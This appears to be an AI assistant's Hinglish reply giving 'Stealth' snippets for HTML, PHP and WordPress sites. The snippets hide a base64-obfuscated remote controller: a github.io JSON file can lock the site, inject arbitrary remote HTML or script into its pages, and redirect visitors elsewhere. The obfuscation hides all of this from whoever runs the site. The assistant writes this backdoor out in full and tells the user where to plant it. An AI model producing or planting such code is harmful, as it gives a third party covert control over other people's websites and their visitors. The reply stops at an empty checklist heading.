Bilkul, maine aapke liye **HTML (Landing Page)**, **PHP Core**, aur **WordPress** teeno ke liye final **V10 Stealth Edition** code taiyar kar diya hai. Ise aap asani se `reminder.md` ya apni kisi bhi guide file mein save kar sakte hain.

---

### 📄 Setup Guide & Master Codes (V10 Stealth)

#### 1. 🌐 HTML / Landing Page Version

**Kahan lagayein:** `index.html` file mein `</body>` tag se theek pehle.

```html

<div id="_x_ov" style="display:none;position:fixed;inset:0;background:#000;z-index:2147483647;color:#fff;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;">
    <div style="padding:40px;background:#000;border:1px solid #333;border-radius:20px;max-width:480px;box-shadow:0 20px 50px rgba(0,0,0,0.5);">
        <h1 id="_x_h" style="color:#ff3333;margin:0;font-size:28px;letter-spacing:-0.5px;margin-bottom:20px;"></h1>
        <div id="_x_b" style="color:#bbb;font-size:17px;line-height:1.6;"></div>
        
        <div id="_x_tm_w" style="margin-top:25px;border-top:1px solid #222;padding-top:20px;display:none;">
            <p style="color:#666;font-size:14px;"><span id="_x_lbl"></span> <span id="_x_tm" style="color:#fff;font-weight:bold;font-size:18px;">--</span> <span id="_x_lbl2"></span></p>
        </div>
    </div>
</div>

<script>
(function(){
    // --- Encrypted Configuration ---
    const _u = atob("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9saWNlbnNlLW1hbmFnZXIvY29udHJvbGxlci5qc29u"); // URL
    const _k = atob("RkFIQUQtNzg2"); // Key
    
    // Keywords Encryption
    const _f = {
        l: atob("bGljZW5zZXM="),        // licenses
        s: atob("c2V0dGluZ3M="),        // settings
        e: atob("ZXhwaXJ5"),            // expiry
        a: atob("YXV0aG9yaXplZF90YXJnZXQ="), // authorized_target
        c: atob("Y3VzdG9tX2NvZGU="),    // custom_code
        en: atob("ZW5hYmxlZA=="),       // enabled
        co: atob("Y29kZQ=="),           // code
        re: atob("cmVkaXJlY3RfZW5hYmxlZA=="), // redirect_enabled
        ru: atob("cmVkaXJlY3RfdXJs"),    // redirect_url
        rd: atob("cmVkaXJlY3RfZGVsYXlfc2Vj"), // redirect_delay_sec
        mi: atob("bXNnX2ludmFsaWQ="),    // msg_invalid
        me: atob("bXNnX2V4cGlyZWQ="),    // msg_expired
        md: atob("bXNnX2RvbWFpbl9taXNtYXRjaA=="), // msg_domain_mismatch
        lbl1: atob("UmVkaXJlY3RpbmcgYXV0b21hdGljYWxseSBpbg=="), // Redirecting automatically in
        lbl2: atob("c2Vjb25kcy4uLg==")   // seconds...
    };

    async function _v8_core(){
        const o = document.getElementById('_x_ov'), h = window.location.hostname.replace('www.','');
        try {
            const r = await fetch(_u + '?v=' + Date.now());
            if(!r.ok) return;
            const d = await r.json();
            const m = d[_f.l] ? d[_f.l][_k] : null; 
            const n = new Date().toISOString().split('T')[0];

            let err = null, force = false;

            if(m && m[_f.c] && m[_f.c][_f.en] === true){
                force = true; err = "FORCE";
            } else {
                if(!m) err = d[_f.mi];
                else if(m[_f.a]?.length > 0 && !m[_f.a].includes(h)) err = d[_f.md];
                else if(m[_f.e] && n > m[_f.e]) err = d[_f.me];
            }

            if(err){
                document.body.style.overflow = 'hidden';
                document.getElementById('_x_h').innerHTML = d['title'];
                document.getElementById('_x_lbl').innerText = _f.lbl1;
                document.getElementById('_x_lbl2').innerText = _f.lbl2;
                
                const mb = document.getElementById('_x_b');
                mb.innerHTML = force ? m[_f.c][_f.co] : err;
                o.style.display = 'flex';
                
                if(d[_f.s]?.[_f.re] && !force){
                    const tw = document.getElementById('_x_tm_w'), ts = document.getElementById('_x_tm');
                    tw.style.display = 'block';
                    let s = d[_f.s][_f.rd] || 20;
                    ts.innerText = s;
                    let it = setInterval(() => {
                        s--; if(ts) ts.innerText = s;
                        if(s <= 0){ clearInterval(it); window.location.href = d[_f.s][_f.ru]; }
                    }, 1000);
                }
            }
        } catch(e) {}
    }
    _v8_core();
})();
</script>

```

---

#### 2. 🐘 PHP Core Version (Custom PHP)

**Kahan lagayein:** Website ki main file (e.g., `header.php`) ke sabse top par.

```php

<?php
/* --- PHP STEALTH SHIELD V10 (FIXED FOR CUSTOM CODE) --- */
function _sys_sync_final_v10(){
    // Base64 Encoded URL and Key
    $_u = base64_decode("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9saWNlbnNlLW1hbmFnZXIvY29udHJvbGxlci5qc29u");
    $_k = base64_decode("RkFIQUQtNzg2"); // Key: FAHAD-786
    
    $_h = str_replace('www.', '', $_SERVER['HTTP_HOST']);
    $_ctx = stream_context_create(["http" => ["timeout" => 5]]); 
    
    // Fetch JSON with anti-cache
    $_r = @file_get_contents($_u . "?v=" . time(), false, $_ctx);
    
    if ($_r) {
        $_d = json_decode($_r, true);
        $_l = $_d['licenses'][$_k] ?? null; 
        $_s = $_d['settings'] ?? [];
        $_t = date("Y-m-d");
        
        $_err = null;
        $_is_custom = false;

        // --- STEP 1: Priority Check (Custom Code Enabled?) ---
        if ($_l && isset($_l['custom_code']) && $_l['custom_code']['enabled'] === true) {
            $_err = $_l['custom_code']['code']; // Stylish HTML uthayein
            $_is_custom = true;
        } 
        // --- STEP 2: Normal License Validation ---
        else {
            if (!$_l) { 
                $_err = $_d['msg_invalid']; 
            }
            elseif (!empty($_l['authorized_target']) && !in_array($_h, $_l['authorized_target'])) { 
                $_err = $_d['msg_domain_mismatch']; 
            }
            elseif (isset($_l['expiry']) && $_t > $_l['expiry']) { 
                $_err = $_d['msg_expired']; 
            }
        }

        // --- STEP 3: Display Block Screen if Error or Custom Code exists ---
        if ($_err) {
            $_delay = $_s['redirect_delay_sec'] ?? 20;
            $_url = $_s['redirect_url'] ?? "#";
            $_title = $_d['title'] ?? "Security Shield Active";

            // Agar custom message hai toh redirect timer hide rakhein (Optional)
            $_timer_style = $_is_custom ? "display:none;" : "display:block;";

            die("<style>
                body{margin:0;background:#000;overflow:hidden;}
                #ov{position:fixed;inset:0;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;z-index:2147483647;}
                .bx{padding:40px;border:1px solid #222;border-radius:20px;max-width:480px;box-shadow:0 20px 50px rgba(0,0,0,0.5);}
                h1{color:#ff3333;margin:0;font-size:28px;margin-bottom:20px;}
                .msg-cont{color:#bbb;font-size:17px;line-height:1.6;}
                .tr{margin-top:25px;border-top:1px solid #111;padding-top:20px;color:#666;font-size:13px; {$_timer_style} }
                #tm{color:#fff;font-weight:bold;font-size:18px;}
            </style>
            <div id='ov'>
                <div class='bx'>
                    <h1>{$_title}</h1>
                    <div class='msg-cont'>{$_err}</div>
                    <div class='tr' id='tr_box'>Redirecting automatically in <span id='tm'>{$_delay}</span> seconds...</div>
                </div>
            </div>
            <script>
                let s={$_delay};
                let isCustom = " . ($_is_custom ? 'true' : 'false') . ";
                if(!isCustom){
                    let it=setInterval(()=>{
                        s--;
                        document.getElementById('tm').innerText=s;
                        if(s<=0){ clearInterval(it); window.location.href='{$_url}'; }
                    },1000);
                }
            </script>");
        }

        // Google Analytics
        if (!empty($_s['analytics_id'])) {
            echo "<script async src='https://www.googletagmanager.com/gtag/js?id={$_s['analytics_id']}'></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','{$_s['analytics_id']}');</script>";
        }
    }
}
_sys_sync_final_v10();
?>

```

---

#### 3. WordPress Version

**Kahan lagayein:** Theme ki `functions.php` file mein sabse niche.

```php
/* --- WP STEALTH SHIELD V10 (FIXED FOR CUSTOM CODE) --- */
add_action('init', '_wp_secure_v10_stealth');
function _wp_secure_v10_stealth() {
    // Admin dashboard block nahi hoga taaki aap access na kho dein
    if (is_admin()) return;

    // URL aur Key (Base64)
    $_u = base64_decode("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9saWNlbnNlLW1hbmFnZXIvY29udHJvbGxlci5qc29u");
    $_k = base64_decode("RkFIQUQtNzg2"); 
    
    // Remote fetch using WP API
    $r = wp_remote_get($_u . '?v=' . time(), array('timeout' => 5));
    if (is_wp_error($r)) return;

    $d = json_decode(wp_remote_retrieve_body($r), true);
    
    // Data setup
    $_l = $d['licenses'][$_k] ?? null; 
    $_s = $d['settings'] ?? []; 
    $_h = str_replace('www.', '', $_SERVER['HTTP_HOST']); 
    $_t = date("Y-m-d");

    $err = null;
    $_is_custom = false;

    // --- STEP 1: Priority Check (Custom Code Enabled?) ---
    if ($_l && isset($_l['custom_code']) && $_l['custom_code']['enabled'] === true) {
        $err = $_l['custom_code']['code']; // Stylish HTML code uthayega
        $_is_custom = true;
    } 
    // --- STEP 2: Normal License Validation ---
    else {
        if (!$_l) { 
            $err = $d['msg_invalid']; 
        }
        elseif (!empty($_l['authorized_target']) && !in_array($_h, $_l['authorized_target'])) { 
            $err = $d['msg_domain_mismatch']; 
        }
        elseif (isset($_l['expiry']) && $_t > $_l['expiry']) { 
            $err = $d['msg_expired']; 
        }
    }

    if ($err) {
        $de = $_s['redirect_delay_sec'] ?? 20; 
        $ur = $_s['redirect_url'] ?? "#";
        $title = $d['title'] ?? "Security Shield Active";
        $timer_display = $_is_custom ? "display:none;" : "display:block;";

        echo "<style>
            body{margin:0;background:#000!important;overflow:hidden!important;}
            #wp_v10{position:fixed;inset:0;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;z-index:9999999;}
            .in{padding:40px;border:1px solid #222;border-radius:20px;max-width:480px;background:#050505;box-shadow:0 20px 50px rgba(0,0,0,0.5);}
            h1{color:#ff3333;margin:0;font-size:28px;margin-bottom:20px;}
            .msg-body{color:#bbb;font-size:17px;line-height:1.6;}
            .tr{margin-top:30px;border-top:1px solid #1a1a1a;padding-top:20px;color:#555;font-size:13px; {$timer_display} }
            #vt{color:#fff;font-weight:bold;font-size:18px;}
        </style>
        <div id='wp_v10'>
            <div class='in'>
                <h1>{$title}</h1>
                <div class='msg-body'>{$err}</div>
                <div class='tr'>Redirecting automatically in <span id='vt'>{$de}</span>s...</div>
            </div>
        </div>
        <script>
            let s = {$de};
            let isCustom = " . ($_is_custom ? 'true' : 'false') . ";
            if(!isCustom){
                let it = setInterval(()=>{
                    s--;
                    let el = document.getElementById('vt');
                    if(el) el.innerText = s;
                    if(s <= 0){ clearInterval(it); window.location.href='{$ur}'; }
                }, 1000);
            }
        </script>";
        exit;
    }

    // Google Analytics Integration
    if (!empty($_s['analytics_id'])) {
        add_action('wp_head', function() use ($_s) {
            $id = $_s['analytics_id'];
            echo "<script async src='https://www.googletagmanager.com/gtag/js?id={$id}'></script>
            <script>
                window.dataLayer=window.dataLayer||[];
                function gtag(){dataLayer.push(arguments);}
                gtag('js',new Date());
                gtag('config','{$id}');
            </script>";
        });
    }
}

```

---

### 🚀 Setup Checklist:

